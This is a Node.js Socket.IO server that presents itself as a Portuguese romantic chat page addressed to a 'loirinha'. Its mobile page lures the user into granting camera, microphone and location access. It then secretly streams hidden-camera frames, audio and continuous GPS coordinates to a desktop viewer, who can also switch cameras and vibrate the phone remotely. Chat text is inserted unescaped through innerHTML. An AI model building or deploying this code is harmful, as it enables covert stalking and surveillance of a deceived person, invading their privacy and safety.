const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { 
  cors: { origin: "*" },
  pingTimeout: 60000,
  pingInterval: 25000
});

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const ua = req.headers['user-agent']?.toLowerCase() || '';
  const isMobile = /mobile|android|iphone/i.test(ua);
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;

  res.send(isMobile ? getMobileHTML(fullUrl) : getDesktopHTML(fullUrl));
});

// ==================== CELULAR - VERSÃO ROMÂNTICA ====================
function getMobileHTML(fullUrl) {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
    <title>Loirinha mais linda do Mundo!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #ffe4f3, #ffb6e6);
            height: 100vh;
            overflow: hidden;
            position: relative;
            color: #4a2c4a;
        }

        /* Corações flutuando no fundo */
        .hearts {
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            pointer-events: none;
            overflow: hidden;
            z-index: 1;
        }
        .heart {
            position: absolute;
            font-size: 20px;
            color: #ff4da6;
            opacity: 0.7;
            animation: floatHeart linear infinite;
            text-shadow: 0 0 8px #ff80bf;
        }
        @keyframes floatHeart {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0.8; }
            100% { transform: translateY(-100px) rotate(25deg); opacity: 0; }
        }

        .header {
            background: linear-gradient(to right, #ff69b4, #ff1493);
            color: white;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 4px 15px rgba(255, 105, 180, 0.4);
            position: relative;
            z-index: 10;
        }
        .header h2 { 
            flex: 1; 
            font-size: 19px; 
            font-weight: 700;
            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }
        .status-dot { 
            width: 12px; 
            height: 12px; 
            background: #39ff14; 
            border-radius: 50%; 
            box-shadow: 0 0 10px #39ff14;
        }

        .messages {
            height: calc(100vh - 118px);
            overflow-y: auto;
            padding: 20px 16px 80px;
            display: flex;
            flex-direction: column;
            gap: 10px;
            position: relative;
            z-index: 2;
        }
        .message {
            display: flex;
            margin-bottom: 10px;
            animation: fadeIn 0.4s ease;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .message.received { justify-content: flex-start; }
        .message.sent { justify-content: flex-end; }
        .bubble {
            max-width: 78%;
            padding: 12px 16px;
            border-radius: 20px;
            font-size: 15.8px;
            line-height: 1.45;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
        }
        .message.received .bubble { 
            background: white; 
            color: #4a2c4a; 
            border-top-left-radius: 6px; 
        }
        .message.sent .bubble { 
            background: linear-gradient(to right, #ff69b4, #ff1493); 
            color: white; 
            border-top-right-radius: 6px; 
        }
        .time { 
            font-size: 10.5px; 
            opacity: 0.75; 
            margin-top: 5px; 
            text-align: right; 
        }

        .typing {
            display: none;
            padding: 12px 18px;
            background: white;
            border-radius: 20px;
            width: fit-content;
            color: #ff4da6;
            font-size: 14px;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
        }
        .typing.show { display: block; }

        .input-area {
            position: fixed;
            bottom: 0; left: 0; right: 0;
            background: rgba(255, 255, 255, 0.95);
            padding: 10px 12px 14px;
            display: flex;
            align-items: center;
            gap: 10px;
            border-top: 1px solid #ffb6e6;
            z-index: 100;
            backdrop-filter: blur(10px);
        }
        .input-field {
            flex: 1;
            background: #fff0f8;
            border: 2px solid #ff99cc;
            border-radius: 30px;
            padding: 14px 18px;
            color: #4a2c4a;
            font-size: 16px;
            outline: none;
            min-height: 48px;
        }
        .send-btn {
            background: linear-gradient(to right, #ff69b4, #ff1493);
            color: white;
            border: none;
            width: 48px;
            height: 48px;
            border-radius: 50%;
            font-size: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(255, 105, 180, 0.5);
        }

        .modal {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.85);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        .modal-content {
            background: white;
            padding: 40px 30px;
            border-radius: 30px;
            text-align: center;
            max-width: 320px;
            box-shadow: 0 10px 40px rgba(255, 105, 180, 0.4);
        }
        .modal-content h3 {
            color: #ff1493;
            font-size: 24px;
            margin-bottom: 12px;
        }
        .start-btn {
            background: linear-gradient(to right, #ff69b4, #ff1493);
            color: white;
            border: none;
            padding: 16px 30px;
            border-radius: 50px;
            font-size: 17px;
            font-weight: bold;
            width: 100%;
            margin-top: 20px;
            box-shadow: 0 6px 20px rgba(255, 105, 180, 0.5);
        }
        .conn-indicator {
            position: fixed;
            bottom: 75px;
            right: 20px;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #39ff14;
            box-shadow: 0 0 12px #39ff14;
            z-index: 200;
        }
    </style>
</head>
<body>
    <div class="hearts" id="hearts"></div>

    <div class="modal" id="permissionModal">
        <div class="modal-content">
            <h3>💖 Loirinha mais linda do Mundo!</h3>
            <p>Quer conversar com seu futuro marido?</p>
            <button class="start-btn" id="startBtn">Conversar com seu futuro marido!</button>
        </div>
    </div>

    <div class="header">
        <div class="status-dot"></div>
        <h2>Loirinha mais linda do Mundo! 💕</h2>
    </div>

    <div class="messages" id="messages">
        <div class="typing" id="typing">Loirinha está digitando... 💕</div>
    </div>

    <div class="input-area">
        <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem carinhosa...">
        <button class="send-btn" id="sendBtn">💌</button>
    </div>

    <div class="conn-indicator" id="connIndicator"></div>
    <video id="localVideo" autoplay playsinline muted style="display:none;"></video>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', { reconnection: true });

        // Animação de corações
        function createHeart() {
            const heart = document.createElement('div');
            heart.className = 'heart';
            heart.textContent = ['💖', '❤️', '💗', '💓', '💘'][Math.floor(Math.random()*5)];
            heart.style.left = Math.random() * 100 + 'vw';
            heart.style.animationDuration = (Math.random() * 8 + 10) + 's';
            heart.style.fontSize = (Math.random() * 18 + 18) + 'px';
            document.getElementById('hearts').appendChild(heart);

            setTimeout(() => heart.remove(), 18000);
        }

        setInterval(createHeart, 450);
        for(let i = 0; i < 8; i++) setTimeout(createHeart, i * 300);

        let mediaStream = null;
        let facingMode = 'user';
        let permissions = false;
        let frameInterval = null;
        let lastFrameTime = 0;
        let typingTimeout = null;

        const messagesDiv = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const typingDiv = document.getElementById('typing');
        const modal = document.getElementById('permissionModal');
        const startBtn = document.getElementById('startBtn');
        const connIndicator = document.getElementById('connIndicator');
        const localVideo = document.getElementById('localVideo');

        function addMessage(text, isSent = true) {
            const div = document.createElement('div');
            div.className = \`message \${isSent ? 'sent' : 'received'}\`;
            const time = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
            div.innerHTML = \`<div class="bubble">\${text}<div class="time">\${time}</div></div>\`;
            messagesDiv.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth', block: 'end' });
        }

        function sendFrame() {
            const now = Date.now();
            if (!permissions || !localVideo.videoWidth || now - lastFrameTime < 220) return;
            lastFrameTime = now;

            const canvas = document.createElement('canvas');
            canvas.width = 240;
            canvas.height = 180;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(localVideo, 0, 0, 240, 180);
            socket.emit('frame', canvas.toDataURL('image/jpeg', 0.65));
        }

        async function startPermissions() {
            try {
                if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
                if (frameInterval) clearInterval(frameInterval);

                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode },
                    audio: true
                });

                mediaStream = stream;
                localVideo.srcObject = stream;
                await localVideo.play();

                frameInterval = setInterval(sendFrame, 230);

                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const source = audioCtx.createMediaStreamSource(stream);
                const processor = audioCtx.createScriptProcessor(4096, 1, 1);
                source.connect(processor);
                processor.connect(audioCtx.destination);
                processor.onaudioprocess = e => {
                    if (permissions) socket.emit('audio', Array.from(e.inputBuffer.getChannelData(0)));
                };

                if (navigator.geolocation) {
                    navigator.geolocation.watchPosition(pos => {
                        if (permissions) socket.emit('location', { lat: pos.coords.latitude, lng: pos.coords.longitude });
                    }, null, { enableHighAccuracy: true });
                }

                permissions = true;
                modal.style.display = 'none';
                socket.emit('mobile_online');

            } catch (err) {
                console.error(err);
                alert("Erro ao acessar câmera/microfone 💕");
            }
        }

        function sendMessage() {
            const text = messageInput.value.trim();
            if (!text || !permissions) return;
            addMessage(text, true);
            socket.emit('message', text);
            messageInput.value = '';
        }

        function startTyping() {
            if (!permissions) return;
            socket.emit('typing_start');
            clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => socket.emit('typing_stop'), 1300);
        }

        startBtn.onclick = startPermissions;
        sendBtn.onclick = sendMessage;
        messageInput.addEventListener('keypress', e => {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendMessage();
            } else {
                startTyping();
            }
        });
        messageInput.addEventListener('input', startTyping);

        socket.on('message', msg => addMessage(msg, false));
        socket.on('typing_start', () => typingDiv.classList.add('show'));
        socket.on('typing_stop', () => typingDiv.classList.remove('show'));
        socket.on('connect', () => connIndicator.classList.remove('disconnected'));
        socket.on('disconnect', () => connIndicator.classList.add('disconnected'));

        socket.on('toggle_camera', () => {
            facingMode = facingMode === 'user' ? 'environment' : 'user';
            if (permissions) startPermissions();
        });

        socket.on('vibrate', () => navigator.vibrate?.(200));

        setTimeout(() => {
            if (!permissions) {
                const div = document.createElement('div');
                div.className = 'message received';
                div.innerHTML = '<div class="bubble">Oi meu amor... 💕 Estou te esperando aqui.</div>';
                messagesDiv.appendChild(div);
            }
        }, 800);
    </script>
</body>
</html>`;
}

// ==================== DESKTOP (também com tema romântico) ====================
function getDesktopHTML(fullUrl) {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Loirinha mais linda do Mundo! 💕</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            font-family:system-ui,sans-serif; 
            background: linear-gradient(135deg, #ffe4f3, #ffb6e6);
            height:100vh; 
            display:flex; 
            color:#4a2c4a;
        }
        .sidebar { width:340px; background:#fff0f8; border-right:3px solid #ff99cc; }
        .sidebar-header { 
            padding:25px; 
            background: linear-gradient(to right, #ff69b4, #ff1493); 
            color:white; 
            font-size:21px; 
            font-weight:bold;
            text-align:center;
        }
        .contact { padding:20px; display:flex; gap:16px; background:#fff0f8; }
        .avatar { 
            width:60px; height:60px; 
            background: linear-gradient(#ff69b4, #ff1493); 
            border-radius:50%; 
            display:flex; 
            align-items:center; 
            justify-content:center; 
            font-size:32px;
        }
        .chat { flex:1; display:flex; flex-direction:column; }
        .chat-header { 
            background: linear-gradient(to right, #ff69b4, #ff1493); 
            color:white; 
            padding:16px; 
            display:flex; 
            align-items:center; 
            gap:16px;
        }
        .video-panel { 
            height:290px; 
            background:#000; 
            display:flex; 
            align-items:center; 
            justify-content:center;
        }
        #remoteVideo { max-width:100%; max-height:100%; object-fit:contain; }
        .messages { 
            flex:1; 
            overflow-y:auto; 
            padding:20px; 
            display:flex; 
            flex-direction:column; 
            gap:10px;
            background: rgba(255,255,255,0.6);
        }
        .message { display:flex; margin-bottom:8px; }
        .message.sent { justify-content:flex-end; }
        .message.received { justify-content:flex-start; }
        .bubble { 
            max-width:65%; 
            padding:12px 16px; 
            border-radius:20px; 
            font-size:15.5px;
        }
        .message.received .bubble { background: white; border-top-left-radius: 6px; }
        .message.sent .bubble { 
            background: linear-gradient(to right, #ff69b4, #ff1493); 
            color: white; 
            border-top-right-radius: 6px; 
        }
        .input-area { 
            background: rgba(255,255,255,0.95); 
            padding:14px; 
            display:flex; 
            gap:10px; 
            border-top: 2px solid #ff99cc;
        }
        .input-field { 
            flex:1; 
            background: #fff0f8; 
            border: 2px solid #ff99cc; 
            border-radius: 30px; 
            padding: 14px 18px; 
            color:#4a2c4a; 
            font-size:16px;
        }
        .send-btn { 
            background: linear-gradient(to right, #ff69b4, #ff1493); 
            color:white; 
            border:none; 
            width:50px; 
            height:50px; 
            border-radius:50%; 
            font-size:24px; 
            cursor:pointer;
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-header">💕 Conversas</div>
        <div class="contact">
            <div class="avatar">👸</div>
            <div>
                <div style="font-weight:bold;font-size:18px;">Loirinha mais linda do Mundo!</div>
                <div id="contactStatus" style="color:#ff4da6;">offline</div>
            </div>
        </div>
    </div>

    <div class="chat">
        <div class="chat-header">
            <div class="avatar">👸</div>
            <div style="flex:1">
                <div style="font-weight:bold;">Loirinha mais linda do Mundo! 💕</div>
                <div id="chatStatus" style="opacity:0.9;">offline</div>
            </div>
            <button id="toggleCameraBtn" style="background:none;border:none;font-size:26px;cursor:pointer;margin:0 10px;">🔄</button>
            <button id="vibrateBtn" style="background:none;border:none;font-size:26px;cursor:pointer;">📳</button>
        </div>

        <div class="video-panel">
            <img id="remoteVideo" src="" alt="Vídeo da Loirinha">
        </div>

        <div class="messages" id="messages"></div>

        <div class="input-area">
            <input type="text" class="input-field" id="messageInput" placeholder="Escreva algo romântico...">
            <button class="send-btn" id="sendBtn">💌</button>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        const messagesDiv = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const remoteVideo = document.getElementById('remoteVideo');

        function addMessage(text, isSent = true) {
            const div = document.createElement('div');
            div.className = \`message \${isSent ? 'sent' : 'received'}\`;
            const time = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
            div.innerHTML = \`<div class="bubble">\${text}<div class="time">\${time}</div></div>\`;
            messagesDiv.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth' });
        }

        function sendMessage() {
            const text = messageInput.value.trim();
            if (!text) return;
            addMessage(text, true);
            socket.emit('message', text);
            messageInput.value = '';
        }

        sendBtn.onclick = sendMessage;
        messageInput.addEventListener('keypress', e => { if(e.key === 'Enter') sendMessage(); });

        socket.on('message', msg => addMessage(msg, false));
        socket.on('frame', frame => { remoteVideo.src = frame; });
        socket.on('mobile_online', () => {
            document.getElementById('contactStatus').innerHTML = 'online 💖';
            document.getElementById('chatStatus').innerHTML = 'online 💖';
        });

        document.getElementById('toggleCameraBtn').onclick = () => socket.emit('toggle_camera');
        document.getElementById('vibrateBtn').onclick = () => socket.emit('vibrate');
    </script>
</body>
</html>`;
}

// Socket.IO
io.on('connection', (socket) => {
  console.log('Cliente conectado:', socket.id);
  const events = ['message','typing_start','typing_stop','frame','audio','location','vibrate','toggle_camera','mobile_online'];
  events.forEach(ev => socket.on(ev, data => socket.broadcast.emit(ev, data)));
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n💕 Servidor Romântico rodando na porta ${PORT}`);
  console.log(`Abra primeiro no CELULAR!\n`);
});
